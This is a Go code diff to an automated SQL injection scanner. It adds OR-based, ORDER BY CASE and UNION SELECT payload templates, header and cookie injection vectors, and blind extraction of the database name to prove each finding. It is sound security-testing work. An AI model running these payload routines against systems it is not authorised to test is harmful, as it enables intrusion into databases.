+		eqPayload, diffPayload, eqPayload2, diffPayload2, arithmeticCond, arithmeticOK := sqliArithmeticPairs(ip)
+		var eq, dif string
+		if arithmeticOK {
+			eq, _ = sendInjected(ctx, sqliHTTPClient, ip, eqPayload, auth)
+			dif, _ = sendInjected(ctx, sqliHTTPClient, ip, diffPayload, auth)
+		}
+		if arithmeticOK && len(eq) > 0 && len(dif) > 0 && len(eq) < sqliBodyCap && len(dif) < sqliBodyCap &&
 			!bodyLooksLikeWAFBlock(eq) && !bodyLooksLikeWAFBlock(dif) &&
 			vol.matchesBaseline(len(eq)) && abs(len(eq)-len(dif)) > vol.sigDiff(200) &&
 			abs(len(dif)-baseLen) > vol.sigDiff(200) {
 			// Reproduce with different operands to rule out a dynamic page.
-			eq2, _ := sendInjected(ctx, sqliHTTPClient, ip, "4-3", auth)  // = 1
-			dif2, _ := sendInjected(ctx, sqliHTTPClient, ip, "5-3", auth) // = 2
+			eq2, _ := sendInjected(ctx, sqliHTTPClient, ip, eqPayload2, auth)
+			dif2, _ := sendInjected(ctx, sqliHTTPClient, ip, diffPayload2, auth)
 			if vol.matchesBaseline(len(eq2)) && abs(len(eq2)-len(dif2)) > vol.sigDiff(200) {
 				// Numeric context: prove it by extracting the DB name through an AND oracle.
 				// If the endpoint merely evaluates arithmetic for some non-SQL reason, the
 				// extraction fails and nothing is reported.
 				isTrueLike := func(r []byte) bool { return vol.matchesBaseline(len(r)) }
-				if name, dbms, ok := s.blindExtractDBName(ctx, ip, auth, "1 AND (%s)", isTrueLike); ok {
+				if name, dbms, ok := s.blindExtractDBName(ctx, ip, auth, arithmeticCond, isTrueLike); ok {
 					return "boolean_based", fmt.Sprintf(
-						"arithmetic-differential SQLi on param %q — PROVEN by extraction: current database = %q (%s). '2-1'(=1) matched baseline (%dB) while '3-1'(=2) → %dB differed — the value is evaluated inside the query. Verify: %s",
-						ip.Param, name, dbms, baseLen, len(dif), mkSQLmapCmd())
+						"arithmetic-differential SQLi on param %q — PROVEN by extraction: %s. %q matched the original value %q (%dB) while %q produced a different result (%dB) — the value is evaluated inside the query. Verify: %s",
+						ip.Param, blindSQLProofDescription(name, dbms), eqPayload, baselineValue, baseLen, diffPayload, len(dif), mkSQLmapCmd())
 				}
 			}
 		}
 	}
+	// OR/ORDER BY oracles compare their own reproduced TRUE/FALSE response classes
+	// and do not depend on a quiet baseline length. Keep them available on dynamic
+	// pages where the conventional baseline-size gate correctly disabled AND/
+	// arithmetic heuristics; extraction remains the mandatory proof.
+	if !booleanReliable {
+		verifyCmd := fmt.Sprintf("sqlmap -u '%s' -p %s --batch --technique=B", ip.URL, ip.Param)
+		if value, dbms, tru, fls, ok := s.orBasedBlindExtract(ctx, ip, auth); ok {
+			return "boolean_based", fmt.Sprintf(
+				"OR-based blind SQLi on param %q — PROVEN by extraction: %s. TRUE payload %q and FALSE payload %q formed a reproduced two-sided oracle on a dynamic endpoint. Verify: %s",
+				ip.Param, blindSQLProofDescription(value, dbms), tru, fls, verifyCmd)
+		}
+		if isOrderByParameter(ip.Param) {
+			if value, dbms, tru, fls, ok := s.orderByBlindExtract(ctx, ip, auth); ok {
+				return "boolean_based", fmt.Sprintf(
+					"ORDER BY expression SQLi on param %q — PROVEN by CASE-order oracle and extraction: %s. TRUE ordering payload %q and FALSE payload %q produced two stable result orders on a dynamic endpoint. Verify: %s",
+					ip.Param, blindSQLProofDescription(value, dbms), tru, fls, verifyCmd)
+			}
+		}
+	}
 
-	// Time-based detection was removed: SLEEP/WAITFOR/pg_sleep timing verdicts
-	// are FP-prone on slow, tarpitting, or WAF-throttled endpoints. Blind SQLi
-	// with no error/boolean signal is now proven ONLY out-of-band (plantBlindSQLi
-	// below), where the database itself calls back to our listener — deterministic
-	// and free of timing false positives.
+	// Statistical time-based detection runs as a separate, low-concurrency pass;
+	// this fast stage returns only deterministic error/extraction proofs.
 	return "", ""
+}
+
+func isOrderByParameter(name string) bool {
+	n := strings.ToLower(strings.TrimSpace(name))
+	for _, token := range []string{"sort", "order", "orderby", "order_by", "sortby", "sort_by", "column", "field", "dir", "direction", "groupby", "group_by"} {
+		if n == token || strings.HasSuffix(n, "_"+token) {
+			return true
+		}
+	}
+	return false
+}
+
+func (s *SQLiScanner) orBasedBlindExtract(ctx context.Context, ip insertionPoint, auth map[string]string) (value, dbms, truePayload, falsePayload string, ok bool) {
+	b := sqliBaseValue(ip)
+	formats := []string{
+		b + " OR (%s)-- -",
+		b + " OR (%s)#",
+		b + "' OR (%s)-- -",
+		b + "' OR (%s)#",
+		b + `" OR (%s)-- -`,
+		b + ") OR (%s)-- -",
+		b + "') OR (%s)-- -",
+		b + "/**/oR/**/(%s)-- -",
+	}
+	for _, condFmt := range formats {
+		tru := fmt.Sprintf(condFmt, "1=1")
+		fls := fmt.Sprintf(condFmt, "1=2")
+		t1 := sendInjectedResponse(ctx, sqliHTTPClient, ip, tru, auth)
+		f1 := sendInjectedResponse(ctx, sqliHTTPClient, ip, fls, auth)
+		if t1.Status == 0 || f1.Status == 0 || looksLikeBlockPage(t1.Status, t1.Body) || looksLikeBlockPage(f1.Status, f1.Body) ||
+			(t1.Status == f1.Status && bodiesSameObject(t1.Body, f1.Body)) {
+			continue
+		}
+		t2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, tru, auth)
+		f2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, fls, auth)
+		if t2.Status != t1.Status || f2.Status != f1.Status ||
+			!bodiesSameObject(t1.Body, t2.Body) || !bodiesSameObject(f1.Body, f2.Body) {
+			continue
+		}
+		isTrueLike := func(r injectedResponse) bool {
+			return r.Status == t1.Status && bodiesSameObject(t1.Body, r.Body)
+		}
+		if v, d, extracted := s.blindExtractDBNameResponse(ctx, ip, auth, condFmt, isTrueLike); extracted {
+			return v, d, tru, fls, true
+		}
+	}
+	return "", "", "", "", false
+}
+
+func (s *SQLiScanner) orderByBlindExtract(ctx context.Context, ip insertionPoint, auth map[string]string) (value, dbms, truePayload, falsePayload string, ok bool) {
+	b := sqliBaseValue(ip)
+	formats := []string{
+		"CASE WHEN (%s) THEN 1 ELSE 2 END",
+		"CASE WHEN (%s) THEN 1 ELSE 2 END-- -",
+		b + ",CASE WHEN (%s) THEN 1 ELSE 2 END",
+		b + " ASC,CASE WHEN (%s) THEN 1 ELSE 2 END",
+	}
+	for _, condFmt := range formats {
+		tru := fmt.Sprintf(condFmt, "1=1")
+		fls := fmt.Sprintf(condFmt, "1=2")
+		t1 := sendInjectedResponse(ctx, sqliHTTPClient, ip, tru, auth)
+		f1 := sendInjectedResponse(ctx, sqliHTTPClient, ip, fls, auth)
+		if t1.Status == 0 || f1.Status == 0 || looksLikeBlockPage(t1.Status, t1.Body) || looksLikeBlockPage(f1.Status, f1.Body) {
+			continue
+		}
+		different := t1.Status != f1.Status || !bodiesSameObject(t1.Body, f1.Body)
+		if !different {
+			continue
+		}
+		t2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, tru, auth)
+		f2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, fls, auth)
+		if t2.Status != t1.Status || f2.Status != f1.Status ||
+			!bodiesSameObject(t1.Body, t2.Body) || !bodiesSameObject(f1.Body, f2.Body) {
+			continue
+		}
+		isTrueLike := func(r injectedResponse) bool {
+			return r.Status == t1.Status && bodiesSameObject(t1.Body, r.Body)
+		}
+		if v, d, extracted := s.blindExtractDBNameResponse(ctx, ip, auth, condFmt, isTrueLike); extracted {
+			return v, d, tru, fls, true
+		}
+	}
+	return "", "", "", "", false
 }
 
 // unionColumnCount finds the query's column count via ascending ORDER BY N:
@@ -512,19 +786,40 @@ func (s *SQLiScanner) quickProbe(ctx context.Context, ip insertionPoint, auth ma
 // on an injection point ALREADY confirmed error-based-vulnerable — this is
 // pure evidence enrichment, not a new detection surface.
 func (s *SQLiScanner) unionColumnCount(ctx context.Context, ip insertionPoint, auth map[string]string) int {
+	cols, _ := s.unionColumnBoundary(ctx, ip, auth)
+	return cols
+}
+
+func (s *SQLiScanner) unionColumnBoundary(ctx context.Context, ip insertionPoint, auth map[string]string) (int, string) {
 	const maxCols = 20
-	for n := 1; n <= maxCols; n++ {
-		resp, _ := sendInjected(ctx, sqliHTTPClient, ip, fmt.Sprintf("1 ORDER BY %d-- -", n), auth)
-		if resp == "" {
-			return 0
+	b := sqliBaseValue(ip)
+	base, _ := sendInjected(ctx, sqliHTTPClient, ip, b, auth)
+	type boundary struct{ orderFmt, unionFmt string }
+	boundaries := []boundary{
+		{b + " ORDER BY %d-- -", "-1 UNION SELECT %s-- -"},
+		{b + "' ORDER BY %d-- -", b + "' UNION SELECT %s-- -"},
+		{b + `" ORDER BY %d-- -`, b + `" UNION SELECT %s-- -`},
+		{b + "') ORDER BY %d-- -", b + "') UNION SELECT %s-- -"},
+		{b + ")) ORDER BY %d-- -", b + ")) UNION SELECT %s-- -"},
+	}
+	for _, boundary := range boundaries {
+		// A compatible boundary must accept ORDER BY 1. Otherwise its syntax error
+		// would masquerade as a one-column query.
+		one, _ := sendInjected(ctx, sqliHTTPClient, ip, fmt.Sprintf(boundary.orderFmt, 1), auth)
+		if one == "" || sqlErrorAppeared(base, one) || bodyLooksLikeWAFBlock(one) {
+			continue
 		}
-		for _, sig := range sqlErrorSignatures {
-			if sig.MatchString(resp) {
-				return n - 1 // first N that errors → the query has N-1 real columns
+		for n := 2; n <= maxCols+1; n++ {
+			resp, _ := sendInjected(ctx, sqliHTTPClient, ip, fmt.Sprintf(boundary.orderFmt, n), auth)
+			if resp == "" || bodyLooksLikeWAFBlock(resp) {
+				break
+			}
+			if sqlErrorAppeared(base, resp) {
+				return n - 1, boundary.unionFmt
 			}
 		}
 	}
-	return 0 // no boundary found within maxCols — give up quietly, no guess
+	return 0, "" // no boundary found within maxCols — give up quietly, no guess
 }
 
 // unionMarkerColumn tries a UNION SELECT with a unique marker string placed
@@ -532,36 +827,57 @@ func (s *SQLiScanner) unionColumnCount(ctx context.Context, ip insertionPoint, a
 // marker shows up verbatim in the response body — concrete, reproducible
 // proof of UNION-based exploitability, not just "an error appeared".
 func (s *SQLiScanner) unionMarkerColumn(ctx context.Context, ip insertionPoint, auth map[string]string, cols int) (int, string) {
+	return s.unionMarkerColumnWithTemplate(ctx, ip, auth, cols, "-1 UNION SELECT %s-- -")
+}
+
+func (s *SQLiScanner) unionMarkerColumnWithTemplate(ctx context.Context, ip insertionPoint, auth map[string]string, cols int, unionFmt string) (int, string) {
 	if cols <= 0 || cols > 20 {
+		return 0, ""
+	}
+	if !strings.Contains(unionFmt, "%s") {
 		return 0, ""
 	}
 	marker := "rcnUNI0N" + uuid.New().String()[:8]
 	for pos := 1; pos <= cols; pos++ {
-		vals := make([]string, cols)
-		for i := range vals {
-			if i+1 == pos {
-				vals[i] = "'" + marker + "'"
-			} else {
-				vals[i] = "NULL"
+		// Different engines enforce UNION column types differently. Try common
+		// string coercions only after the column count is known; reflection of the
+		// random marker is still the required proof.
+		for _, markerExpr := range []string{
+			"'" + marker + "'",
+			"CAST('" + marker + "' AS VARCHAR(64))",
+			"CAST('" + marker + "' AS CHAR(64))",
+		} {
+			vals := make([]string, cols)
+			for i := range vals {
+				if i+1 == pos {
+					vals[i] = markerExpr
+				} else {
+					vals[i] = "NULL"
+				}
 			}
-		}
-		payload := fmt.Sprintf("-1 UNION SELECT %s-- -", strings.Join(vals, ","))
-		resp, _ := sendInjected(ctx, sqliHTTPClient, ip, payload, auth)
-		if strings.Contains(resp, marker) {
-			return pos, payload
+			payload := fmt.Sprintf(unionFmt, strings.Join(vals, ","))
+			resp, _ := sendInjected(ctx, sqliHTTPClient, ip, payload, auth)
+			if strings.Contains(resp, marker) {
+				return pos, payload
+			}
 		}
 	}
 	return 0, ""
 }
 
-// headerChecks injects SQL payloads into Cookie and User-Agent on a small
-// sample of live hosts (these are common, often-missed SQLi vectors).
-func (s *SQLiScanner) headerChecks(ctx context.Context, targetID string, logFn LogFunc, found *atomic.Int64) {
+// headerChecks runs the same deterministic/extraction/timing engine over common
+// header and real authenticated-cookie insertion points.
+
+func (s *SQLiScanner) headerChecks(ctx context.Context, targetID string, auth map[string]string, logFn LogFunc, found *atomic.Int64) {
+	limit := sqliFallbackMaxParams
+	if s.cfg != nil {
+		limit = s.cfg.URLLimit()
+	}
 	rows, err := s.db.QueryContext(ctx, `
 		SELECT url FROM http_services
 		WHERE target_id = ? AND status_code BETWEEN 200 AND 403
-		ORDER BY url LIMIT 40
-	`, targetID)
+		ORDER BY url LIMIT ?
+	`, targetID, limit)
 	if err != nil {
 		return
 	}
@@ -577,7 +893,7 @@ func (s *SQLiScanner) headerChecks(ctx context.Context, targetID string, logFn L
 	if len(urls) == 0 {
 		return
 	}
-	logFn("info", "sqli", fmt.Sprintf("Testing Cookie/User-Agent SQLi on %d hosts...", len(urls)))
+	logFn("info", "sqli", fmt.Sprintf("Testing Cookie/header SQLi on %d live URL(s)...", len(urls)))
 
 	sem := make(chan struct{}, 8)
 	var wg sync.WaitGroup
@@ -594,9 +910,66 @@ func (s *SQLiScanner) headerChecks(ctx context.Context, targetID string, logFn L
 			// just as commonly logged/queried server-side while being assumed
 			// "trusted" — a frequent real-world SQLi vector (hunt-sqli root cause
 			// #9: HTTP headers stored in the DB without sanitisation).
-			for _, hdr := range []string{"Cookie", "User-Agent", "X-Forwarded-For", "Referer"} {
-				if kind, ev := s.headerProbe(ctx, target, hdr); kind != "" {
-					val := "id=INJECT"
+			type headerVector struct{ header, parameter, value string }
+			ua := headerValue(auth, "User-Agent")
+			if ua == "" {
+				ua = "Mozilla/5.0 (compatible; ReconnerSQLi/1.0)"
+			}
+			xff := headerValue(auth, "X-Forwarded-For")
+			if xff == "" {
+				xff = "127.0.0.1"
+			}
+			ref := headerValue(auth, "Referer")
+			if ref == "" {
+				ref = target
+			}
+			hostValue := "example.invalid"
+			if u, err := url.Parse(target); err == nil && u.Host != "" {
+				hostValue = u.Host
+			}
+			valueOr := func(name, fallback string) string {
+				if v := headerValue(auth, name); v != "" {
+					return v
+				}
+				return fallback
+			}
+			vectors := []headerVector{
+				{header: "User-Agent", parameter: "User-Agent", value: ua},
+				{header: "X-Forwarded-For", parameter: "X-Forwarded-For", value: xff},
+				{header: "X-Real-IP", parameter: "X-Real-IP", value: valueOr("X-Real-IP", "127.0.0.1")},
+				{header: "True-Client-IP", parameter: "True-Client-IP", value: valueOr("True-Client-IP", "127.0.0.1")},
+				{header: "X-Client-IP", parameter: "X-Client-IP", value: valueOr("X-Client-IP", "127.0.0.1")},
+				{header: "X-Forwarded-Host", parameter: "X-Forwarded-Host", value: valueOr("X-Forwarded-Host", hostValue)},
+				{header: "Accept-Language", parameter: "Accept-Language", value: valueOr("Accept-Language", "en-US")},
+				{header: "Referer", parameter: "Referer", value: ref},
+			}
+			cookieNames := cookieParameterNames(headerValue(auth, "Cookie"))
+			if len(cookieNames) == 0 {
+				cookieNames = []string{"id"}
+			}
+			for _, name := range cookieNames {
+				value := cookieValue(headerValue(auth, "Cookie"), name)
+				if value == "" {
+					value = "1"
+				}
+				vectors = append(vectors, headerVector{header: "Cookie", parameter: name, value: value})
+			}
+			for _, vec := range vectors {
+				hdr := vec.header
+				loc := "header"
+				if hdr == "Cookie" {
+					loc = "cookie"
+				}
+				hip := insertionPoint{URL: target, Param: vec.parameter, Value: vec.value, Method: "GET", Location: loc}
+				kind, ev := s.quickProbe(ctx, hip, auth)
+				if kind == "" && (s.cfg == nil || s.cfg.SQLiTimeBased) {
+					if dbms, timingEvidence, ok := s.timeBasedSQLi(ctx, hip, auth); ok {
+						kind = "time_based"
+						ev = timingEvidence + " (header DBMS: " + dbms + ")"
+					}
+				}
+				if kind != "" {
+					val := vec.value + "<INJECT>"
 					switch hdr {
 					case "User-Agent":
 						val = "UA-INJECT"
@@ -605,7 +978,10 @@ func (s *SQLiScanner) headerChecks(ctx context.Context, targetID string, logFn L
 					case "Referer":
 						val = "https://INJECT/"
 					}
-					s.store(targetID, "sqli", "high", target, hdr+" header", kind, ev+" (via "+hdr+" header: "+val+")")
+					if hdr == "Cookie" {
+						val = vec.parameter + "=INJECT"
+					}
+					s.store(targetID, "sqli", "high", hip, kind, ev+" (via "+hdr+" header: "+val+")")
 					found.Add(1)
 					logFn("warn", "sqli", fmt.Sprintf("Header SQLi (%s) via %s: %s", kind, hdr, target))
 					s.notify(targetID, target, hdr)
@@ -616,11 +992,11 @@ func (s *SQLiScanner) headerChecks(ctx context.Context, targetID string, logFn L
 	wg.Wait()
 }
 
-func (s *SQLiScanner) headerProbe(ctx context.Context, target, header string) (string, string) {
+func (s *SQLiScanner) headerProbe(ctx context.Context, target, header, parameter string, auth map[string]string) (string, string) {
 	// error-based (same FP guards as the parameter path: not a WAF block, and it
 	// must reproduce while staying absent from a fresh baseline).
-	base := s.fetchWithHeader(ctx, target, header, "recon-baseline")
-	errResp := s.fetchWithHeader(ctx, target, header, "recon'\"`")
+	base := s.fetchWithHeaderAuth(ctx, target, header, parameter, "recon-baseline", auth)
+	errResp := s.fetchWithHeaderAuth(ctx, target, header, parameter, "recon'\"`", auth)
 	for _, sig := range sqlErrorSignatures {
 		if !sig.MatchString(errResp) || sig.MatchString(base) {
 			continue
@@ -628,8 +1004,8 @@ func (s *SQLiScanner) headerProbe(ctx context.Context, target, header string) (s
 		if bodyLooksLikeWAFBlock(errResp) {
 			break
 		}
-		base2 := s.fetchWithHeader(ctx, target, header, "recon-baseline")
-		errResp2 := s.fetchWithHeader(ctx, target, header, "recon'\"`")
+		base2 := s.fetchWithHeaderAuth(ctx, target, header, parameter, "recon-baseline", auth)
+		errResp2 := s.fetchWithHeaderAuth(ctx, target, header, parameter, "recon'\"`", auth)
 		if !sig.MatchString(errResp2) || sig.MatchString(base2) {
 			break
 		}
@@ -641,7 +1017,16 @@ func (s *SQLiScanner) headerProbe(ctx context.Context, target, header string) (s
 	return "", ""
 }
 
+// fetchWithHeader is the compatibility helper used by focused tests/callers.
 func (s *SQLiScanner) fetchWithHeader(ctx context.Context, target, header, injection string) string {
+	parameter := header
+	if header == "Cookie" {
+		parameter = "id"
+	}
+	return s.fetchWithHeaderAuth(ctx, target, header, parameter, injection, nil)
+}
+
+func (s *SQLiScanner) fetchWithHeaderAuth(ctx context.Context, target, header, parameter, injection string, auth map[string]string) string {
 	reqCtx, cancel := context.WithTimeout(ctx, 15*time.Second)
 	defer cancel()
 	req, err := http.NewRequestWithContext(reqCtx, "GET", target, nil)
@@ -650,9 +1035,12 @@ func (s *SQLiScanner) fetchWithHeader(ctx context.Context, target, header, injec
 	}
 	// A default UA so non-UA header tests still send a normal-looking request.
 	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")
+	for k, v := range auth {
+		req.Header.Set(k, v)
+	}
 	switch header {
 	case "Cookie":
-		req.Header.Set("Cookie", "id="+injection)
+		req.Header.Set("Cookie", replaceCookieValue(req.Header.Get("Cookie"), parameter, injection))
 	case "User-Agent":
 		req.Header.Set("User-Agent", injection)
 	case "X-Forwarded-For":
@@ -672,26 +1060,82 @@ func (s *SQLiScanner) fetchWithHeader(ctx context.Context, target, header, injec
 	return string(body)
 }
 
-func (s *SQLiScanner) store(targetID, vulnType, severity, rawURL, param, kind, evidence string) {
-	// Confidence reflects HOW the SQLi was proven: an error message or a
-	// reproduced 5s time-delay is near-certain; a boolean length-diff is strong
-	// but heuristic (kept as a high candidate until re-verified).
+func cookieParameterNames(cookie string) []string {
+	seen := map[string]bool{}
+	var out []string
+	for _, part := range strings.Split(cookie, ";") {
+		kv := strings.SplitN(strings.TrimSpace(part), "=", 2)
+		if len(kv) != 2 {
+			continue
+		}
+		name := strings.TrimSpace(kv[0])
+		if name != "" && !seen[strings.ToLower(name)] {
+			seen[strings.ToLower(name)] = true
+			out = append(out, name)
+		}
+	}
+	return out
+}
+
+func cookieValue(cookie, name string) string {
+	for _, part := range strings.Split(cookie, ";") {
+		kv := strings.SplitN(strings.TrimSpace(part), "=", 2)
+		if len(kv) == 2 && strings.EqualFold(strings.TrimSpace(kv[0]), name) {
+			return kv[1]
+		}
+	}
+	return ""
+}
+
+func replaceCookieValue(cookie, name, value string) string {
+	if strings.TrimSpace(name) == "" {
+		name = "id"
+	}
+	var parts []string
+	found := false
+	for _, part := range strings.Split(cookie, ";") {
+		part = strings.TrimSpace(part)
+		if part == "" {
+			continue
+		}
+		kv := strings.SplitN(part, "=", 2)
+		if len(kv) == 2 && strings.EqualFold(strings.TrimSpace(kv[0]), name) {
+			parts = append(parts, strings.TrimSpace(kv[0])+"="+value)
+			found = true
+		} else {
+			parts = append(parts, part)
+		}
+	}
+	if !found {
+		parts = append(parts, name+"="+value)
+	}
+	return strings.Join(parts, "; ")
+}
+
+func (s *SQLiScanner) store(targetID, vulnType, severity string, ip insertionPoint, kind, evidence string) {
+	// Confidence reflects HOW the SQLi was proven. Boolean observations reach this
+	// function only after DB-name/user/version extraction; timing requires linear
+	// 0/2/5-second scaling; errors are reproduced and baseline-differential.
 	conf := 85
 	switch kind {
 	case "error_based":
-		conf = 92
+		conf = 95
 	case "time_based":
-		conf = 90
+		conf = 97
 	case "boolean_based":
-		conf = 85
+		conf = 97
 	}
 	verdict := VerifyVerified
 	if conf < ConfEvidence {
 		verdict = CandDetected
 	}
+	method := strings.ToUpper(strings.TrimSpace(ip.Method))
+	if method == "" {
+		method = "GET"
+	}
 	_, _ = RecordDetectorObservation(context.Background(), s.db, DetectorObservation{
 		TargetID: targetID, Type: vulnType, Subtype: kind, Severity: severity,
-		URL: rawURL, Method: "GET", Parameter: param, Location: "query", Payload: kind,
+		URL: ip.URL, Method: method, Parameter: ip.Param, Location: insertionLocation(ip),
 		Evidence: evidence, Source: "sqli-native", DetectionMethod: kind,
 		Confidence: conf, Verdict: verdict,
 	})
